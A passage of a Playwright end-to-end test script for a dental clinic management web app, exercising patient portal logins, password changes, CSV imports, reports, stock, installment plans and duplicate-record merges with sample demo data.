  await pl.getByRole('button', { name: 'Close' }).first().click();
  await logOut({ staff: true });
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.locator('input[name=username]').fill('hamzaqureshi-9812');
  await form.locator('input[type=password]').fill('later-pass-4455'); // the old password no longer works
  await form.locator('input[type=password]').press('Enter'); // the card re-centres when a message goes away, so a click can miss the moving button
  await pl.locator('.field-error', { hasText: 'do not match' }).waitFor();
  await form.locator('input[type=password]').fill(slip.password);
  await form.locator('input[type=password]').press('Enter'); // the card re-centres when a message goes away, so a click can miss the moving button
  await pl.waitForSelector('h1:has-text("Choose your own password")');
});
await step('a staff login cannot be given a name that looks like a patient login', async () => {
  await logOut();
  await pl.goto(BASE + '#/login/staff');
  await pl.getByRole('button', { name: /Dr. Ali Rashid/ }).click();
  await pl.waitForSelector('.topbar');
  await pl.goto(BASE + '#/staff/admin?tab=staff');
  await pl.getByRole('button', { name: 'New staff account' }).click();
  const m = pl.locator('.modal');
  await m.getByPlaceholder('Full name').fill('Patient Lookalike');
  await m.locator('input[type=email]').fill('lookalike-1705@dralirashid.com');
  await m.getByRole('button', { name: 'Create account' }).click();
  await pl.locator('.toast', { hasText: 'shape of a patient login' }).waitFor();
});

await step('the invitation by email is refused for an address at the clinic domain, and still works for a real one', async () => {
  await pl.keyboard.press('Escape').catch(() => {});
  const ids = await pl.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const mk = async (full_name, email) => (await state.data.createPatient({ full_name, phone: '0300 1112223', email, first_branch_id: 1 })).id;
    return { planted: await mk('Planted Address', 'newdoc@dralirashid.com'), real: await mk('Real Address', 'real.address@example.com') };
  });
  await pl.goto(BASE + `#/staff/patient/${ids.planted}`);
  await pl.waitForSelector('h1:has-text("Planted Address")');
  await pl.getByRole('button', { name: 'Invite to patient portal' }).click();
  await pl.locator('.toast', { hasText: 'Use Create portal login for clinic usernames.' }).waitFor();
  await pl.locator('.portal-login-line', { hasText: 'Portal login: none yet' }).waitFor(); // nothing was linked
  await pl.goto(BASE + `#/staff/patient/${ids.real}`);
  await pl.waitForSelector('h1:has-text("Real Address")');
  await pl.getByRole('button', { name: 'Invite to patient portal' }).click();
  await pl.locator('.toast', { hasText: 'Invitation sent to real.address@example.com' }).waitFor();
  await pl.locator('.portal-login-line', { hasText: 'Portal login: own email (invited)' }).waitFor();
  expectErrors(/Use Create portal login for clinic usernames/);
});

await step('the login slip keeps the username in one piece before the @, sets a long one smaller, and even the longest username prints on one A6 page', async () => {
  const name = 'Muhammad Abdul Rehman Siddiqui Al Hashmi'; // the name part is cut to 24 letters
  const cases = [['Ali Rashid', '1705'], [name, '1705'], [name, '9'.repeat(10)], [name, '9'.repeat(30)]]; // 14, 29, 35 and 55 characters before the @
  const measured = await pl.evaluate(async ({ cases }) => {
    const { loginSlip } = await import('/js/views/staff/portal-login.js');
    const holder = document.createElement('div');
    holder.style.cssText = 'position:fixed;left:0;top:0;width:351px;background:#fff;z-index:99999'; // an A6 page between its 6 mm margins, on screen
    document.body.append(holder);
    const rows = [];
    for (const [fullName, mr] of cases) {
      const username = fullName.toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 24) + '-' + mr + '@dralirashid.com';
      const slip = loginSlip({ full_name: fullName, mr_number: mr }, username, 'queen-sheep-zebra-9876');
      holder.replaceChildren(slip);
      const user = slip.querySelector('.slip-user');
      const parts = [...user.querySelectorAll('.slip-nowrap')];
      const edge = slip.getBoundingClientRect().right - parseFloat(getComputedStyle(slip).paddingRight);
      const pw = [...slip.querySelectorAll('.slip-value')].at(-1);
      rows.push({
        username, text: user.textContent, font: parseFloat(getComputedStyle(user).fontSize), lines: parts.map((s) => s.getClientRects().length),
        inside: parts.every((s) => s.getBoundingClientRect().right <= edge + 0.5), passwordFits: pw.scrollWidth <= pw.clientWidth + 0.5,
        domainBelow: parts.length === 2 ? parts[1].getBoundingClientRect().top >= parts[0].getBoundingClientRect().bottom - 1 : null,
      });
    }
    holder.remove();
    return rows;
  }, { cases });
  for (const r of measured) {
    assert.equal(r.text, r.username, 'the markup does not change the text');
    assert.deepEqual(r.lines, [1, 1], `${r.username}: the name, dash and Mr# never split over two lines (and the domain stays whole)`);
    assert.ok(r.inside, `${r.username} fits inside the slip`);
    assert.ok(r.passwordFits, `the password of a slip with ${r.username} fits too`);
  }
  const sizes = measured.map((r) => r.font);
  assert.ok(sizes[0] > sizes[1] && sizes[1] > sizes[2] && sizes[2] > sizes[3], `a longer username is set smaller: ${sizes.join(' > ')}`);
  assert.ok(measured[3].domainBelow || measured[3].domainBelow === false, 'the longest wraps (or not) only between the name part and the @');
  // The longest one on the real slip dialog prints on one A6 page.
  await pl.evaluate(async ({ username }) => {
    const { showLoginSlip } = await import('/js/views/staff/portal-login.js');
    showLoginSlip({ full_name: 'Muhammad Abdul Rehman Siddiqui Al Hashmi', mr_number: '9'.repeat(30) }, username, 'queen-sheep-zebra-9876');
  }, { username: measured[3].username });
  await pl.waitForSelector('.login-slip');
  const pdf = await pl.pdf({ preferCSSPageSize: true, printBackground: true });
  const pages = (pdf.toString('latin1').match(/\/Type\s*\/Page[^s]/g) || []).length;
  assert.equal(pages, 1, 'the longest username still prints on one page');
  const box = pdf.toString('latin1').match(/MediaBox\s*\[\s*0\s+0\s+([\d.]+)\s+([\d.]+)\s*\]/);
  assert.ok(box && Math.abs(Number(box[1]) - 297.6) < 3 && Math.abs(Number(box[2]) - 419.5) < 3, 'and it is A6');
  await pl.getByRole('button', { name: 'Close' }).first().click();
});

// Makes a portal login for a new patient the way the front desk does, and returns what is on the slip.
const makeLoginFor = async (fullName) => {
  await pl.evaluate(async (n) => { const { state } = await import('/js/state.js'); await state.data.createPatient({ full_name: n, phone: '0300 1112223', first_branch_id: 1 }); }, fullName);
  await openPatient(fullName);
  await pl.getByRole('button', { name: 'Create portal login' }).click();
  const m = pl.locator('.modal');
  const made = { username: await m.locator('input[readonly]').inputValue(), password: await m.getByLabel('Password').inputValue() };
  await m.getByRole('button', { name: 'Create login' }).click();
  await pl.waitForSelector('.login-slip');
  await pl.getByRole('button', { name: 'Close' }).first().click();
  return made;
};
// Logs a patient in with the slip and fills the "Choose your own password" screen (with the stand-in for getPatient already in place when asked).
const firstLogin = async (made, { failPortal = false, next = 'my-own-pass-88' } = {}) => {
  await logOut({ staff: true });
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.locator('input[name=username]').fill(made.username.split('@')[0]);
  await form.locator('input[type=password]').fill(made.password);
  await form.locator('input[type=password]').press('Enter');
  await pl.waitForSelector('h1:has-text("Choose your own password")');
  if (failPortal) {
    await pl.evaluate(async () => {
      const { state } = await import('/js/state.js');
      window.__realGetPatient ||= state.data.getPatient;
      state.data.getPatient = async () => { throw new Error('Failed to fetch'); }; // the connection drops right after the password is saved
    });
  }
  const fields = pl.locator('input[autocomplete=new-password]');
  await fields.nth(0).fill(next);
  await fields.nth(1).fill(next);
  await pl.getByRole('button', { name: 'Save my password' }).click();
};
const restorePortal = () => pl.evaluate(async () => { const { state } = await import('/js/state.js'); if (window.__realGetPatient) state.data.getPatient = window.__realGetPatient; });

await step('after the forced new password, a portal that cannot load shows a card with "Try again" instead of a "Loading your account…" that never ends', async () => {
  const made = await makeLoginFor('Retry Card');
  await firstLogin(made, { failPortal: true });
  await pl.getByRole('heading', { name: 'We could not open your account' }).waitFor();
  const card = await pl.locator('.login-card').innerText();
  assert.match(card, /Your new password is saved\./);
  assert.match(card, /We could not reach the clinic system/, 'in the patient\'s words, no database text');
  assert.equal(await pl.getByText('Loading your account').count(), 0, 'not a stuck loading screen');
  assert.equal(await pl.getByRole('button', { name: 'Try again' }).count(), 1);
  assert.equal(await pl.getByRole('button', { name: 'Log out' }).count(), 1);
  assert.ok(await pl.evaluate(() => document.activeElement?.tagName === 'H1'), 'the heading has the focus');
  await shot(pl, '18-portal-could-not-open');
  await pl.getByRole('button', { name: 'Try again' }).click(); // still failing: the card comes back
  await pl.getByRole('heading', { name: 'We could not open your account' }).waitFor();
  await restorePortal();
  await pl.getByRole('button', { name: 'Try again' }).click(); // the connection is back
  await pl.waitForSelector('h1:has-text("Hello, Retry")');
  assert.equal(await pl.locator('h1:has-text("Choose your own password")').count(), 0);
  expectErrors(/Failed to fetch/);
});
await step('the same card has a Log out button that leaves the account', async () => {
  await logOut();
  await pl.goto(BASE + '#/login/staff');
  await pl.getByRole('button', { name: /Dr. Ali Rashid/ }).click();
  await pl.waitForSelector('.topbar');
  const made = await makeLoginFor('Logout Card');
  await firstLogin(made, { failPortal: true });
  await pl.getByRole('heading', { name: 'We could not open your account' }).waitFor();
  await pl.getByRole('button', { name: 'Log out' }).click();
  await pl.waitForFunction(() => location.hash === '#/');
  await pl.waitForSelector('.door');
  await restorePortal();
  // The password was saved before the connection dropped: the new one works and opens the portal directly.
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.locator('input[name=username]').fill(made.username);
  await form.locator('input[type=password]').fill('my-own-pass-88');
  await form.locator('input[type=password]').press('Enter');
  await pl.waitForSelector('h1:has-text("Hello, Logout")');
  expectErrors(/Failed to fetch/);
});

await step('Dr. Ali imports a Healthwire transactions export on the Import page', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=import');
  await p7.waitForSelector('h2:text("1. Payments and invoices")');
  const csv = [
    "Dr. Ali Rashid's Dental Clinic,,,,,,,,,,,,,,,", ',,,,,,,,,,,,,,,', 'Financial Transaction Report,,,,,,,,,,,,,,,',
    'Invoice#,MR#,Patient Name,Patient Phone#,Location,Description,Total,Cash,Discount,Dues,Advance,Mode Of Payment,Created By,Updated By,Discounted By,Payment Date',
    '900006,7991,Import Test One,3009990001,-,Braces First Payment,150000,40000,110000,0,0,Cash ,RJ Mall Clinic,RJ Mall Clinic,,01/08/2026 - 12:36AM',
    '134007,9557,Import Test Two lhr,3001112223,-,"Braces Monthly Payment,brackets",8000,4000,0,4000,0,Debit/Credit Card ,Lahore Gulberg Clinic,Lahore Gulberg Clinic,,05/08/2026 - 06:00PM',
    'Totals:,,,,,,158000,44000,110000,4000,0,,,,,', ''].join('\n');
  await p7.locator('input[type=file]').first().setInputFiles({ name: 'Transactions Report.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await p7.waitForSelector('.stat:has-text("Invoices")');
  const text = await p7.locator('main').innerText();
  assert.match(text, /Rs 44,000/);
  assert.match(text, /Lahore/);
  await p7.getByRole('button', { name: /Import this file: 2 patients, 2 invoices, 2 payments, 2 visits/ }).click();
  await p7.waitForSelector('.alert:has-text("Invoices: 2 added")');
  assert.match(await p7.locator('.alert').innerText(), /Patients: 2 added/);
});
await step('Dr. Ali imports an Aaj ki List tab: branch and date chosen, visits with doctors land on the patients', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=import');
  await p7.waitForSelector('h2:text("4. Aaj ki List history")');
  // Rows: an Mr#; no Mr# but the phone and first name of a patient file (the only way a row without an Mr# is matched, never a name
  // alone); no Mr# and a phone nobody has (not matched, listed afterwards); no Mr# and a Treatment that says checkup (a checkup patient,
  // not a visit: not counted and not sent; those go to the checkup list through "5. Checkup list").
  const csv = [
    "Tt Mr #,Tt Patient Name,Monthly,Tt Treatment,Token No,Waiting,Group,Doctor's Name,Tt Treatment Details,P.P,Healthwire,Tt Contact No,Reminder Status",
    '9811,Areeba Siddiqui,4,Monthly,3,Completed,,"Dr. Hina (sample), Assistant Uzma (sample)",U L 016 Pc refresh,,Done,,',
    ',Hamza Qureshi,8,Monthly,4,Completed,Group 3,Dr Nida,U L 018,,,0301 0734521,Called',
    ',Nobody Here At All,,Filling,5,Completed,,Dr. Nobody Listed,,,,0300 5550000,',
    ',Checkup Only Sample,,Checkup,6,Completed,,Dr Nida,,,,0300 5550999,',
    ''].join('\n');
  const aaj = p7.locator('section.panel:has(h2:text("4. Aaj ki List history")) input[type=file]');
  await aaj.setInputFiles({ name: 'aaj-ki-list-sample.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await p7.waitForSelector('section[data-tab]');
  await p7.locator('section[data-tab] select[aria-label^="Branch for"]').selectOption('2');
  await p7.locator('section[data-tab] input[type=date]').fill('2026-08-20');
  await p7.locator('section[data-tab] input[type=date]').dispatchEvent('change');
  await p7.waitForSelector('button:has-text("Import 3 visits")');
  assert.match(await p7.locator('main').innerText(), /Dr\. Nobody Listed \(1\)/, 'unknown doctor name listed');
  await p7.locator('.alert:has-text("1 row has no Mr# and a Treatment that says checkup")').waitFor();
  await p7.getByRole('button', { name: 'Import 3 visits' }).click();
  await p7.waitForSelector('.alert:has-text("Visits: 2 added")');
  const text = await p7.locator('main').innerText();
  assert.match(text, /Doctors and assistants added to 3 visit slots/);
  assert.match(text, /Checkup patients not imported as visits: 1/);
  assert.match(text, /1 names could not be matched/);
  const unmatched = await p7.locator('table.list', { has: p7.locator('th', { hasText: 'Name on the sheet' }) }).locator('tbody').innerText();
  assert.match(unmatched, /Nobody Here At All/);
  assert.doesNotMatch(unmatched, /Checkup Only Sample/, 'the checkup row is skipped, not listed as a patient that could not be matched');
  await p7.goto(BASE + '#/staff/patients');
  await p7.fill('input[type=search]', '9811');
  await p7.locator('table.list tbody tr:has-text("9811") a').first().click();
  await p7.waitForSelector('h2:has-text("Money")');
  const visitText = await p7.locator('main').innerText();
  assert.match(visitText, /20 Aug 2026/);
  assert.match(visitText, /Aaj ki List \(aaj-ki-list-sample\)/);
  await shot(p7, '12-import-healthwire');
});

await step('Dr. Ali adds a treatment on the Clinic setup page and it reaches the sheet dropdown', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=setup');
  await p7.waitForSelector('h2:text("Treatments")');
  assert.ok((await p7.locator('h2:text("Branches")').count()) && (await p7.locator('h2:text("Doctors and assistants")').count()));
  await p7.locator('section', { hasText: 'Treatments' }).getByRole('button', { name: 'New treatment' }).click();
  const m = p7.locator('.modal');
  await m.getByLabel('Name').fill('Night guard');
  await m.getByLabel('Default price').fill('15000');
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.toast:has-text("Saved")');
  await p7.waitForSelector('td:text("Night guard")');
  await p7.goto(BASE + '#/staff/sheet');
  await p7.waitForSelector('#sheet-treatments', { state: 'attached' });
  assert.ok(await p7.locator('#sheet-treatments option[value="Night guard"]').count());
  await shot(p7, '13-clinic-setup');
});
await step('Dr. Ali adds a doctor group on the Clinic setup page (the sheet has a Group 4) and the Aaj ki List offers it in the Group drop-down and the Group filter, dark red as on the sheet', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=setup');
  await p7.locator('section', { hasText: 'Doctor groups' }).getByRole('button', { name: 'New group' }).click();
  const m = p7.locator('.modal');
  await m.getByLabel('Group number').fill('4');
  await m.getByLabel('Name').fill('Group 4');
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('td:text("Group 4")');
  await p7.goto(BASE + '#/staff/sheet?branch=1');
  const group = p7.locator('table.sheet tbody tr:not(.is-checkup) select[aria-label^="Doctor group for"]').first();
  await group.waitFor();
  assert.deepEqual(await group.locator('option').allInnerTexts(), ['No group', 'Group 1', 'Group 2', 'Group 3', 'Group 4']);
  assert.deepEqual(await p7.locator('select[aria-label="Filter by doctor group"] option').allInnerTexts(), ['Any group', 'Group 1', 'Group 2', 'Group 3', 'Group 4']);
  const was = await group.inputValue();
  const who = (await group.getAttribute('aria-label')).replace('Doctor group for ', '');
  const groupOf = () => p7.locator(`select[aria-label="Doctor group for ${who}"]`);
  await groupOf().selectOption('4');
  await p7.waitForFunction((w) => document.querySelector(`select[aria-label="Doctor group for ${w}"]`)?.classList.contains('gs-darkred'), who);
  await groupOf().selectOption(was); // (as it was, for the steps below)
  await p7.waitForFunction(([w, v]) => { const s = document.querySelector(`select[aria-label="Doctor group for ${w}"]`); return s && s.value === v && !s.classList.contains('gs-darkred'); }, [who, was]);
});

await step('Reports: families and report tabs like the Healthwire financial report', async () => {
  await p7.locator('.topnav .menu:has-text("Reports") > button').click();
  await p7.locator('.topnav .menu-list a:has-text("Financial")').click();
  await p7.waitForSelector('.report-groups .tab[aria-selected="true"]:has-text("Financial")');
  const tabs = (await p7.locator('.report-tabs .tab').allTextContents()).map((t) => t.trim());
  for (const t of ['Transactions', 'Summary', 'Payment mode', 'Procedures', 'Income statement', 'Doctors share', 'Pending payments', 'Advance payments', 'Void invoices', 'Refunds', 'Discounts', 'Statistics', 'Cost per patient']) assert.ok(tabs.includes(t), t);
  await p7.waitForSelector('h2:text("Transactions")');
  await p7.locator('input[aria-label="From"]').fill('2020-01-01');
  await p7.locator('input[aria-label="From"]').dispatchEvent('change');
  await p7.waitForSelector('.report-table tbody tr');
  assert.ok(await p7.locator('.stat:has-text("Received")').count());
  await p7.locator('.report-tabs .tab:has-text("Income statement")').click();
  await p7.waitForSelector('h2:text("Income statement by month")');
  await p7.locator('.report-tabs .tab:has-text("Pending payments")').click();
  await p7.waitForSelector('h2:text("Pending payments by branch")');
  await p7.locator('.report-tabs .tab:has-text("Doctors share")').click();
  await p7.waitForSelector('h2:text("Doctors share")');
  await p7.locator('.report-groups .tab:has-text("OPD")').click();
  await p7.waitForSelector('h2:text("OPD by day")');
  await p7.locator('.report-groups .tab:has-text("Inventory")').click();
  await p7.waitForSelector('h2:text("Stock levels")');
  await p7.locator('.report-groups .tab:has-text("HR")').click();
  await p7.locator('.report-tabs .tab:has-text("Logins")').click();
  await p7.waitForSelector('h2:text("Staff accounts")');
  await p7.locator('.report-groups .tab:has-text("Financial")').click();
  await p7.waitForSelector('h2:text("Transactions")');
  await shot(p7, '14-reports');
});

await step('installment plan: set up on the patient page, overdue shows for the coordinator', async () => {
  await p7.goto(BASE + '#/staff/patients');
  await p7.waitForSelector('table.list tbody tr');
  await p7.click('table.list tbody tr:has(.badge:has-text("Braces")) a');
  await p7.waitForSelector('h3:text("Installment plan")');
  await p7.getByRole('button', { name: /Set up a plan|New plan/ }).click();
  const m = p7.locator('.modal');
  await m.getByLabel('Total to pay').fill('60000');
  await m.getByLabel('Number of installments').fill('3');
  const past = new Date(); past.setMonth(past.getMonth() - 2);
  await m.getByLabel('First installment due').fill(past.toISOString().slice(0, 10));
  await m.getByLabel('First installment due').dispatchEvent('change');
  await m.getByLabel('Count payments from').fill(past.toISOString().slice(0, 10));
  await m.getByRole('button', { name: 'Save plan' }).click();
  await p7.waitForSelector('.toast:has-text("Installment plan saved")');
  await p7.waitForSelector('.badge:has-text("Overdue")');
  // Take a payment against the oldest unpaid invoice: the form offers the invoice list.
  await p7.getByRole('button', { name: 'Take payment' }).click();
  await p7.locator('.modal').getByLabel('For invoice').waitFor();
  await p7.locator('.modal').getByRole('button', { name: 'Cancel' }).click();
  await p7.goto(BASE + '#/staff/coordinator?tab=reminders');
  await p7.waitForSelector('h2:text("Installments due")');
  assert.ok(await p7.locator('.badge:has-text("Overdue")').count());
  await shot(p7, '15-installments-due');
});

await step('braces off → retainer case with a next check date', async () => {
  await p7.goto(BASE + '#/staff/patients');
  await p7.waitForSelector('table.list tbody tr');
  await p7.click('table.list tbody tr:has(.badge:has-text("Braces")) a');
  await p7.waitForSelector('h2:has-text("Braces")');
  await p7.getByRole('button', { name: 'Edit case' }).click();
  await p7.locator('.modal').getByLabel('Case status').selectOption('debonded');
  await p7.locator('.modal').getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.modal:has-text("start the retainer case")');
  await p7.locator('.modal').getByRole('button', { name: 'Start retainer case' }).click();
  await p7.waitForSelector('.toast:has-text("Retainer case started")');
  await p7.waitForSelector('h2:text("Retainers")');
  await p7.goto(BASE + '#/staff/coordinator?tab=retainers');
  await p7.waitForSelector('th:text("Next check")');
  assert.ok(await p7.locator('input[aria-label^="Next check"]').count());
});

await step('medical history is saved and shown on the patient page', async () => {
  await p7.goto(BASE + '#/staff/patients');
  await p7.waitForSelector('table.list tbody tr');
  await p7.click('table.list tbody tr:first-child a');
  await p7.waitForSelector('h2:has-text("Money")');
  await p7.getByRole('button', { name: 'Edit', exact: true }).click();
  await p7.locator('.modal label:has-text("Diabetes") input').check();
  await p7.locator('.modal').getByLabel('Allergies').fill('penicillin');
  await p7.locator('.modal label:has-text("Treatment consent form signed") input').check();
  await p7.locator('.modal').getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.toast:has-text("Saved")');
  await p7.waitForSelector('p:has-text("Medical:")');
  assert.match(await p7.locator('p:has-text("Medical:")').innerText(), /Diabetes.*penicillin/);
  assert.ok(await p7.locator('.badge:has-text("Consent signed")').count());
});

await step('Aaj ki List: all branches view and the day download button; on a 1366px laptop its Branch column makes the list scroll sideways rather than squeeze Treatment Details', async () => {
  await p7.goto(BASE + '#/staff/sheet?branch=all');
  await p7.waitForSelector('table.sheet');
  await p7.waitForSelector('th:text("Branch"):not([hidden])');
  assert.ok((await p7.locator('table.sheet tbody tr').count()) >= 1);
  assert.ok(await p7.getByRole('button', { name: 'Download' }).count());
  assert.equal(await p7.locator('.add-panel:not([hidden])').count(), 0);
  const cols = await p7.evaluate(() => {
    const th = (t) => [...document.querySelectorAll('table.sheet thead th')].find((x) => x.textContent.replace('▾', '').trim() === t);
    const details = th('Treatment Details');
    const wrap = document.querySelector('.sheet-wrap');
    const spill = [...document.querySelectorAll('table.sheet tbody .details-cell')].filter((c) => [...c.children].some((el) => el.getBoundingClientRect().right > c.closest('td').getBoundingClientRect().right + 0.5)).length;
    const input = document.querySelector('table.sheet tbody input[aria-label^="Treatment details for"]');
    return { viewport: window.innerWidth, branch: Math.round(th('Branch').getBoundingClientRect().width), details: Math.round(details.getBoundingClientRect().width),
      headCut: details.scrollWidth > details.clientWidth, input: Math.round(input.getBoundingClientRect().width), sideScroll: wrap.scrollWidth > wrap.clientWidth, spill };
  });
  assert.equal(cols.viewport, 1366);
  assert.ok(cols.branch >= 100 && cols.details >= 250 && !cols.headCut && cols.input >= 200, 'Treatment Details keeps its room: ' + JSON.stringify(cols));
  assert.ok(cols.sideScroll && cols.spill === 0, 'the list scrolls sideways and nothing spills out of the details cell: ' + JSON.stringify(cols));
  await p7.locator('select[aria-label="Branch"]').selectOption({ index: 1 });
  await p7.waitForSelector('.add-panel:not([hidden])');
});

await step('stock: receive and use items, low-stock warning', async () => {
  await p7.goto(BASE + '#/staff/stock');
  await p7.waitForSelector('h2:has-text("Stock ·")');
  assert.ok(await p7.locator('.alert-warning:has-text("reorder level")').count(), 'demo seed has a low item');
  assert.ok(await p7.locator('.reorder-list h2:has-text("Reorder list")').count(), 'reorder list for the supplier');
  assert.ok(await p7.locator('.reorder-list button:has-text("Download for the supplier")').count());
  await p7.locator('.reorder-list ~ section tr', { hasText: '014 NiTi wire' }).getByRole('button', { name: '+ Received' }).click();
  await p7.locator('.modal').getByLabel('Quantity').fill('20');
  await p7.locator('.modal').getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.toast:has-text("Stock updated")');
  await p7.waitForSelector('tr:has-text("014 NiTi wire") td:has-text("23 pcs")');
  assert.equal(await p7.locator('.reorder-list tr:has-text("014 NiTi wire")').count(), 0, 'restocked item leaves the reorder list');
  assert.ok(await p7.locator('h2:has-text("Recent moves")').count());
  await shot(p7, '16-stock');
});

await step('stock: one tab per branch in the clinic\'s order, then a Total tab that adds up all branches', async () => {
  const tabNames = await p7.locator('[role="tablist"][aria-label="Branch"] [role="tab"]').allInnerTexts();
  assert.equal(tabNames[tabNames.length - 1], 'Total', `the last tab is Total: ${tabNames.join(', ')}`);
  assert.ok(tabNames.length >= 3, 'the branches, then Total');
  await p7.getByRole('tab', { name: 'Total' }).click();
  await p7.waitForSelector('h2:has-text("Total stock · all branches")');
  const row = p7.locator('tr', { hasText: '014 NiTi wire' });
  const cells = await row.locator('td.right').allInnerTexts();
  const nums = cells.map((c) => Number.parseInt(c, 10));
  assert.equal(nums[nums.length - 1], nums.slice(0, -1).reduce((a, b) => a + b, 0), `the Total column is the sum of the branches: ${cells.join(' | ')}`);
  assert.equal(await p7.getByRole('button', { name: '+ Received' }).count(), 0, 'the Total tab is read only');
  assert.match(p7.url(), /branch=all/);
  await p7.getByRole('tab', { name: tabNames[0] }).click();
  await p7.waitForSelector(`h2:has-text("Stock · ${tabNames[0]}")`);
});

await step('edited photo upload is marked for the patient and the website', async () => {
  await p7.goto(BASE + '#/staff/patients');
  await p7.waitForSelector('table.list tbody tr');
  await p7.click('table.list tbody tr:first-child a');
  await p7.waitForSelector('h2:has-text("Photos and X-rays")');
  await p7.getByRole('button', { name: 'Upload photos' }).click();
  await p7.setInputFiles('.modal input[type=file]', { name: 'after.png', mimeType: 'image/png', buffer: Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64') });
  await p7.locator('.modal label:has-text("Edited before/after") input').check();
  await p7.locator('.modal').getByRole('button', { name: 'Upload' }).click();
  await p7.waitForSelector('.toast:has-text("uploaded")');
  await p7.waitForSelector('figcaption:has-text("edited (patient sees it)")');
});

await step('duplicate patients: a second record with the same phone is found and merged', async () => {
  // Patient 2 in the demo has phone 03010734521 (i = 1). Register a second record with that number.
  await p7.goto(BASE + '#/staff/patients');
  await p7.getByRole('button', { name: 'New patient' }).click();
  const m = p7.locator('.modal');
  await m.getByLabel('Full name').fill('Duplicate Test Person');
  await m.getByLabel('Phone number').fill('03010734521');
  await m.getByLabel('Phone number').press('Tab');
  await p7.waitForSelector('.modal .alert-warning:has-text("Possible existing patient")');
  await m.getByRole('button', { name: 'Create patient' }).click();
  await p7.waitForSelector('.toast:has-text("registered as Mr#")');
  await p7.goto(BASE + '#/staff/admin?tab=duplicates');
  await p7.waitForSelector('h2:has-text("03010734521")');
  const group = p7.locator('section.panel', { hasText: '03010734521' });
  assert.ok(await group.locator('td:has-text("Duplicate Test Person")').count());
  await group.getByRole('button', { name: 'Merge into the ticked one' }).click();
  await p7.locator('.modal').getByLabel('I have compared these records').check();
  await p7.locator('.modal').getByRole('button', { name: /^Merge 1 into Mr#/ }).click();
  await p7.waitForSelector('.toast:has-text("Merged:")');
  assert.equal(await p7.locator('h2:has-text("03010734521")').count(), 0);
  await shot(p7, '17-duplicates');
});

await step('"View as patient" shows the record the way the patient sees it', async () => {
  await p7.goto(BASE + '#/staff/patients');
  await p7.waitForSelector('table.list tbody tr');
  await p7.click('table.list tbody tr:first-child a');
  await p7.waitForSelector('h2:has-text("Money")');
  await p7.getByRole('link', { name: 'View as patient' }).click();
  await p7.waitForSelector('.alert:has-text("Patient view")');
  assert.ok(await p7.locator('h1:has-text("Hello,")').count());
  assert.ok(await p7.locator('h2:has-text("Invoices and payments")').count());
  assert.ok(await p7.locator('button:has-text("Report / complain")[disabled]').count(), 'complaint button is switched off in the preview');
  await shot(p7, '18-view-as-patient');
  await p7.getByRole('link', { name: 'Back to the record' }).click();
  await p7.waitForSelector('h2:has-text("Money")');
});

await step('sheet filters (doctor, dues, find) and quick-tap treatment details', async () => {
  await p7.goto(BASE + '#/staff/sheet?branch=1');
  await p7.waitForSelector('table.sheet tbody tr');
  const total = await p7.locator('table.sheet tbody tr').count();
  await p7.getByRole('button', { name: /^Filters/ }).click();
  await p7.locator('label:has-text("With dues") input').check();
  const withDues = await p7.locator('table.sheet tbody tr').count();
  assert.ok(withDues <= total);
  await p7.locator('label:has-text("With dues") input').uncheck();
  await p7.locator('input[aria-label="Find on this list"]').fill('zzzz-no-such-name');
  assert.ok(await p7.locator('table.sheet tbody td:has-text("No patients")').count());
  await p7.locator('input[aria-label="Find on this list"]').fill('');
  await p7.waitForSelector('table.sheet tbody tr .quick-tap');
  await p7.locator('table.sheet tbody tr .quick-tap').first().click();
  await p7.locator('.modal button:has-text("018")').click();
  await p7.locator('.modal button:has-text("PC")').first().click();
  await p7.locator('.modal').getByRole('button', { name: 'Done' }).click();
  const v = await p7.locator('table.sheet tbody tr').first().locator('input[aria-label^="Treatment details"]').inputValue();
  assert.match(v, /018 PC$/);
});

await step('payment receipt opens from the patient record; WhatsApp link next to the phone', async () => {
  await p7.goto(BASE + '#/staff/patients');
  await p7.waitForSelector('table.list tbody tr');
  await p7.click('table.list tbody tr:first-child a');
  await p7.waitForSelector('h2:has-text("Money")');
  assert.ok(await p7.locator('.phone-link a[href^="https://wa.me/92"]').count(), 'WhatsApp link');
  await p7.locator('details summary:has-text("payments")').click();
  await p7.locator('button:has-text("Receipt")').first().click();
  await p7.waitForSelector('.modal .invoice-sheet:has-text("Payment receipt")');
  assert.match(await p7.locator('.modal .invoice-sheet').innerText(), /Received/);
  await p7.locator('.modal .modal-actions').getByRole('button', { name: 'Close' }).click();
});

await step('complaint linked to a doctor shows on that doctor\'s own dashboard with their share', async () => {
  await p7.goto(BASE + '#/staff/complaints');
  await p7.waitForSelector('table.list tbody tr');
  await p7.locator('table.list tbody tr').first().locator('button.link-btn').click();
  await p7.waitForSelector('.modal select[aria-label="About which doctor"]');
  await p7.locator('.modal select[aria-label="About which doctor"]').selectOption({ label: 'Dr. Hina (sample)' });
  await p7.waitForSelector('.toast:has-text("Saved")');
  await p7.keyboard.press('Escape');
  const pd = await newPage();
  await loginAs(pd, 'Dr. Bushra');
  await pd.goto(BASE + '#/staff/log');
  await pd.waitForSelector('.stat:has-text("Own patients (brought in)")');
  const text = await pd.locator('main').innerText();
  assert.match(text, /Own patients \(brought in\)/);
  assert.match(text, /Your share \(30% of own patients paid\)/);
  assert.match(text, /Complaints about your work/);
  await shot(pd, '13-doctor-dashboard');
  await pd.close();
});

const p6 = await newPage({ width: 390, height: 844 });
await step('sheet works on a phone', async () => {
  await loginAs(p6, 'Front desk \\(Gulshan\\)').catch(async () => {
    await p6.goto(BASE + '#/login/staff');
